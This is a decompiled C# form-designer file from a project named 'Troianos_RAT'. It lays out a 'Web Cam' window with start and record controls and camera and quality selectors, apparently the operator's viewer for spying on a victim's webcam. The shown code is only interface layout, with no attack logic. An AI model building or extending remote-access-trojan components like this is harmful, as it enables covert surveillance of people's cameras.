namespace Troianos_RAT
{
	// Token: 0x0200000B RID: 11
	[global::Microsoft.VisualBasic.CompilerServices.DesignerGenerated]
	public partial class Cam : global::System.Windows.Forms.Form
	{
		// Token: 0x060000A7 RID: 167 RVA: 0x001DE874 File Offset: 0x001DCC74
		[global::System.Diagnostics.DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		// Token: 0x060000A8 RID: 168 RVA: 0x001DE8C4 File Offset: 0x001DCCC4
		[global::System.Diagnostics.DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			global::System.ComponentModel.ComponentResourceManager componentResourceManager = new global::System.ComponentModel.ComponentResourceManager(typeof(global::Troianos_RAT.Cam));
			this.Panel1 = new global::System.Windows.Forms.Panel();
			this.ComboBox2 = new global::System.Windows.Forms.ComboBox();
			this.Button1 = new global::System.Windows.Forms.Button();
			this.CheckBox3 = new global::System.Windows.Forms.CheckBox();
			this.ComboBox1 = new global::System.Windows.Forms.ComboBox();
			this.PictureBox1 = new global::System.Windows.Forms.PictureBox();
			this.ProgressBar1 = new global::System.Windows.Forms.ProgressBar();
			this.vmethod_6 = new global::System.Windows.Forms.Timer(this.components);
			this.Timer1 = new global::System.Windows.Forms.Timer(this.components);
			this.Panel1.SuspendLayout();
			((global::System.ComponentModel.ISupportInitialize)this.PictureBox1).BeginInit();
			this.SuspendLayout();
			this.Panel1.Controls.Add(this.ComboBox2);
			this.Panel1.Controls.Add(this.Button1);
			this.Panel1.Controls.Add(this.CheckBox3);
			this.Panel1.Controls.Add(this.ComboBox1);
			this.Panel1.Dock = global::System.Windows.Forms.DockStyle.Bottom;
			global::System.Windows.Forms.Control panel = this.Panel1;
			global::System.Drawing.Point location = new global::System.Drawing.Point(0, 226);
			panel.Location = location;
			this.Panel1.Name = "Panel1";
			global::System.Windows.Forms.Control panel2 = this.Panel1;
			global::System.Drawing.Size size = new global::System.Drawing.Size(406, 23);
			panel2.Size = size;
			this.Panel1.TabIndex = 0;
			this.ComboBox2.BackColor = global::System.Drawing.Color.Black;
			this.ComboBox2.Dock = global::System.Windows.Forms.DockStyle.Right;
			this.ComboBox2.DropDownStyle = global::System.Windows.Forms.ComboBoxStyle.DropDownList;
			this.ComboBox2.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.ComboBox2.ForeColor = global::System.Drawing.Color.White;
			this.ComboBox2.FormattingEnabled = true;
			this.ComboBox2.Items.AddRange(new object[]
			{
				"%100",
				"%90",
				"%80",
				"%70",
				"%60",
				"%50"
			});
			global::System.Windows.Forms.Control comboBox = this.ComboBox2;
			location = new global::System.Drawing.Point(319, 0);
			comboBox.Location = location;
			this.ComboBox2.Name = "ComboBox2";
			global::System.Windows.Forms.Control comboBox2 = this.ComboBox2;
			size = new global::System.Drawing.Size(87, 21);
			comboBox2.Size = size;
			this.ComboBox2.TabIndex = 3;
			this.Button1.BackColor = global::System.Drawing.Color.Transparent;
			this.Button1.FlatStyle = global::System.Windows.Forms.FlatStyle.Popup;
			this.Button1.ForeColor = global::System.Drawing.Color.White;
			global::System.Windows.Forms.Control button = this.Button1;
			location = new global::System.Drawing.Point(1, 1);
			button.Location = location;
			this.Button1.Name = "Button1";
			global::System.Windows.Forms.Control button2 = this.Button1;
			size = new global::System.Drawing.Size(95, 21);
			button2.Size = size;
			this.Button1.TabIndex = 2;
			this.Button1.Text = "Iniciar";
			this.Button1.UseVisualStyleBackColor = false;
			this.CheckBox3.AutoSize = true;
			this.CheckBox3.ForeColor = global::System.Drawing.Color.White;
			global::System.Windows.Forms.Control checkBox = this.CheckBox3;
			location = new global::System.Drawing.Point(102, 3);
			checkBox.Location = location;
			this.CheckBox3.Name = "CheckBox3";
			global::System.Windows.Forms.Control checkBox2 = this.CheckBox3;
			size = new global::System.Drawing.Size(58, 17);
			checkBox2.Size = size;
			this.CheckBox3.TabIndex = 1;
			this.CheckBox3.Text = "Gravar";
			this.CheckBox3.UseVisualStyleBackColor = true;
			this.ComboBox1.Anchor = (global::System.Windows.Forms.AnchorStyles.Left | global::System.Windows.Forms.AnchorStyles.Right);
			this.ComboBox1.BackColor = global::System.Drawing.Color.Black;
			this.ComboBox1.DropDownStyle = global::System.Windows.Forms.ComboBoxStyle.DropDownList;
			this.ComboBox1.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.ComboBox1.ForeColor = global::System.Drawing.Color.White;
			this.ComboBox1.FormattingEnabled = true;
			global::System.Windows.Forms.Control comboBox3 = this.ComboBox1;
			location = new global::System.Drawing.Point(173, 0);
			comboBox3.Location = location;
			this.ComboBox1.Name = "ComboBox1";
			global::System.Windows.Forms.Control comboBox4 = this.ComboBox1;
			size = new global::System.Drawing.Size(146, 21);
			comboBox4.Size = size;
			this.ComboBox1.TabIndex = 0;
			this.PictureBox1.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Bottom | global::System.Windows.Forms.AnchorStyles.Left | global::System.Windows.Forms.AnchorStyles.Right);
			global::System.Windows.Forms.Control pictureBox = this.PictureBox1;
			location = new global::System.Drawing.Point(0, 0);
			pictureBox.Location = location;
			this.PictureBox1.Name = "PictureBox1";
			global::System.Windows.Forms.Control pictureBox2 = this.PictureBox1;
			size = new global::System.Drawing.Size(406, 214);
			pictureBox2.Size = size;
			this.PictureBox1.SizeMode = global::System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			this.PictureBox1.TabIndex = 1;
			this.PictureBox1.TabStop = false;
			this.ProgressBar1.Dock = global::System.Windows.Forms.DockStyle.Bottom;
			global::System.Windows.Forms.Control progressBar = this.ProgressBar1;
			location = new global::System.Drawing.Point(0, 216);
			progressBar.Location = location;
			this.ProgressBar1.Name = "ProgressBar1";
			global::System.Windows.Forms.Control progressBar2 = this.ProgressBar1;
			size = new global::System.Drawing.Size(406, 10);
			progressBar2.Size = size;
			this.ProgressBar1.TabIndex = 2;
			global::System.Drawing.SizeF autoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = global::System.Drawing.Color.Black;
			size = new global::System.Drawing.Size(406, 249);
			this.ClientSize = size;
			this.Controls.Add(this.ProgressBar1);
			this.Controls.Add(this.PictureBox1);
			this.Controls.Add(this.Panel1);
			this.ForeColor = global::System.Drawing.Color.White;
			this.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.Fixed3D;
			this.Icon = (global::System.Drawing.Icon)componentResourceManager.GetObject("$this.Icon");
			this.Name = "Cam";
			this.ShowInTaskbar = false;
			this.StartPosition = global::System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "Web Cam";
			this.Panel1.ResumeLayout(false);
			this.Panel1.PerformLayout();
			((global::System.ComponentModel.ISupportInitialize)this.PictureBox1).EndInit();
			this.ResumeLayout(false);
		}

		// Token: 0x04000051 RID: 81
		private global::System.ComponentModel.IContainer components;
	}
}
